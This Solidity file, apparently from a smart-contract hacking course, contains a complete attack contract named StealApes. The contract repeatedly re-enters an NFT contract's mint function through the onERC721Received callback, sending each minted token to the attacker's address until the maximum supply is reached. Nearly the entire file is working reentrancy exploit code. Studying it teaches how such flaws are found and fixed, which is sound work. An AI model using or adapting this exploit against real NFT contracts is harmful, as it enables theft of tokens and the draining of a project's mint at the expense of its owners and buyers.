// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;

interface IApes {
    function mint() external returns (uint16);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function maxSupply() external returns (uint16);
}

/**
 * @title StealApes
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract StealApes {
    IApes apes;
    address owner;

    constructor(address _apesAddress) {
        apes = IApes(_apesAddress);
        owner = msg.sender;
    }

    function attack() external {
        apes.mint();
    }

    function onERC721Received(
        address _sender, address _from, uint256 _tokenId, bytes memory _data)
        external returns (bytes4 retval) {
        
        require(msg.sender == address(apes), "bye bye");
        apes.transferFrom(address(this), owner, _tokenId);

        if(_tokenId < apes.maxSupply())  {
            apes.mint();
        }

        return StealApes.onERC721Received.selector;
        // return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

}


